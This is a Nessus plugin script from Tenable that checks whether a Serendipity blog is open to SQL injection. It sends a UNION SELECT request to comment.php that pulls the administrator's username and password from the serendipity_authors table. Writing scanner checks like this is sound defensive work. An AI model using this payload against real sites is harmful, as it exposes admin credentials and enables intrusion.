#
# This script is (C) Tenable Network Security
#
#




if(description)
{
 script_id(14842);
 script_bugtraq_id(11269);
 if (defined_func("script_xref")) {
  script_xref(name:"OSVDB", value:"10370");
  script_xref(name:"OSVDB", value:"10371");
 }
 script_version ("$Revision: 1.4 $");

 name["english"] = "Serendipity SQL Injections";

 script_name(english:name["english"]);
 
 desc["english"] = "
The remote version of Serendipity is vulnerable to a SQL injection issue
due to a failure of the application to properly sanitize user-supplied
URI input. 

An attacker may exploit this flaw to issue arbitrary statements in the 
remote database, and therefore bypass authorization or even overwrite 
arbitrary files on the remote system

Solution : Upgrade to Serendipity 0.7.0beta3 or newer
Risk factor : High";


 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for SQL injection vulnerability in Serendipity";
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2004-2005 Tenable Network Security",
		francais:"Ce script est Copyright (C) 2004-2005 Tenable Network Security");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("serendipity_detect.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/serendipity"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
 loc = matches[2];
 req = http_get(item:string(loc, "/comment.php?serendipity[type]=trackbacks&serendipity[entry_id]=0%20and%200%20union%20select%201,2,3,4,username,password,7,8,9,0,1,2,3%20from%20serendipity_authors%20where%20authorid=1%20/*"), port:port);			
 r = http_keepalive_send_recv(port:port, data:req, bodyonly:1);
 if( r == NULL )exit(0);

 if( egrep(pattern:"<b>Weblog: </b> [a-f0-9]*<br />", string:r) &&
     "0 and 0 union select 1,2,3,4,username,password,7,8,9,0,1,2,3 from serendipity_authors where authorid=1" >< r )
 {
 	security_hole(port);
 }
}
